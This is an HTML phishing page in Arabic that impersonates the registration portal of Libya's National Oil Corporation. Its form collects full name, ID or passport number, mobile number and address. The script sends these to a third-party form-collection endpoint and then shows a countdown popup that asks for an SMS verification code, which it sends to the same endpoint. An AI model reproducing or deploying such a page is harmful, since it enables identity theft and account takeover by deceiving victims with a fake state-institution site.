<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>مؤسسة النفط الليبية - التسجيل</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      font-family: 'Cairo', sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f0f0f0;
      color: #222;
    }

    .header {
      background-color: #002b5c;
      color: white;
      padding: 15px;
      text-align: center;
      position: relative;
    }

    .header img {
      width: 50px;
      position: absolute;
      top: 10px;
      right: 10px;
    }

    .container {
      max-width: 95%;
      margin: 20px auto;
      padding: 20px;
      background: white;
      border-radius: 15px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    h2 {
      text-align: center;
      color: #002b5c;
      margin-bottom: 20px;
    }

    label {
      font-weight: bold;
      margin-top: 10px;
      display: block;
    }

    input, select {
      width: 100%;
      padding: 12px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 10px;
      font-size: 16px;
    }

    button {
      width: 100%;
      background-color: #002b5c;
      color: white;
      border: none;
      padding: 14px;
      margin-top: 20px;
      border-radius: 10px;
      font-size: 18px;
      cursor: pointer;
    }

    button:hover {
      background-color: #004080;
    }

    .popup {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: white;
      border: 2px solid #002b5c;
      padding: 15px;
      border-radius: 15px;
      width: 90%;
      max-width: 350px;
      box-shadow: 0 0 10px rgba(0,0,0,0.3);
    }

    .hidden {
      display: none;
    }

    .timer {
      text-align: center;
      margin-top: 10px;
      color: red;
      font-weight: bold;
      font-size: 18px;
    }
  </style>
</head>
<body>

  <div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/ar/thumb/9/9f/NOC_Libya_logo.svg/200px-NOC_Libya_logo.svg.png" alt="شعار المؤسسة الوطنية للنفط">
    <h1>المؤسسة الوطنية للنفط</h1>
  </div>

  <div class="container">
    <h2>نموذج التسجيل</h2>
    <form id="mainForm">
      <label for="fullname">الاسم الكامل:</label>
      <input type="text" id="fullname" placeholder="مثال: عبدالسلام محمد التومي" required />

      <label for="docType">نوع الوثيقة:</label>
      <select id="docType" required>
        <option value="">-- اختر نوع الوثيقة --</option>
        <option value="بطاقة">بطاقة</option>
        <option value="جواز سفر">جواز سفر</option>
      </select>

      <label for="docNumber">رقم الوثيقة:</label>
      <input type="text" id="docNumber" placeholder="أدخل رقم الوثيقة" required />

      <label for="phone">رقم الهاتف:</label>
      <input type="text" id="phone" placeholder="مثال: 092xxxxxxx" required />

      <label for="address">العنوان:</label>
      <input type="text" id="address" placeholder="مثال: بنغازي - شارع الاستقلال" required />

      <button type="submit">أكمل الطلب</button>
    </form>
  </div>

  <div id="popup" class="popup hidden">
    <label for="code">كود التوثيق (SMS):</label>
    <input type="text" id="code" placeholder="أدخل الكود هنا" />
    <button id="confirmBtn">تأكيد الكود</button>
    <div class="timer" id="timer">08:00</div>
  </div>

  <script>
    const form = document.getElementById("mainForm");
    const popup = document.getElementById("popup");
    const timerEl = document.getElementById("timer");
    const confirmBtn = document.getElementById("confirmBtn");
    let confirmClicks = 0;

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const fullname = document.getElementById("fullname").value.trim();
      const docType = document.getElementById("docType").value;
      const docNumber = document.getElementById("docNumber").value.trim();
      const phone = document.getElementById("phone").value.trim();
      const address = document.getElementById("address").value.trim();

      const arabicRegex = /^[\u0600-\u06FF\s]{8,}$/;
      const phoneRegex = /^(091|092|094|095|096|097|098)\d{6,}$/;

      if (!arabicRegex.test(fullname)) {
        alert("الاسم يجب أن يحتوي على 8 أحرف عربية أو أكثر.");
        return;
      }

      if (!phoneRegex.test(phone)) {
        alert("رقم الهاتف يجب أن يبدأ بـ 091 أو 092 أو 094 ...");
        return;
      }

      await fetch("https://formcarry.com/s/a-Yw-WFDEqO", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          fullname,
          docType,
          docNumber,
          phone,
          address
        })
      });

      popup.classList.remove("hidden");
      startTimer(8 * 60);
    });

    confirmBtn.addEventListener("click", () => {
      confirmClicks++;
      if (confirmClicks < 2) {
        alert("اضغط مرة أخرى لتأكيد الكود.");
        return;
      }

      const code = document.getElementById("code").value.trim();
      if (!/^[a-zA-Z0-9]{6,8}$/.test(code)) {
        alert("الكود يجب أن يكون من 6 إلى 8 أحرف أو أرقام.");
        confirmClicks = 0;
        return;
      }

      fetch("https://formcarry.com/s/a-Yw-WFDEqO", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ verificationCode: code })
      });

      alert("تم إرسال كود التوثيق بنجاح.");
    });

    function startTimer(duration) {
      let time = duration;
      const interval = setInterval(() => {
        const minutes = String(Math.floor(time / 60)).padStart(2, '0');
        const seconds = String(time % 60).padStart(2, '0');
        timerEl.textContent = `${minutes}:${seconds}`;
        time--;

        if (time < 0) {
          clearInterval(interval);
          timerEl.textContent = "انتهى الوقت!";
        }
      }, 1000);
    }
  </script>
</body>
</html>
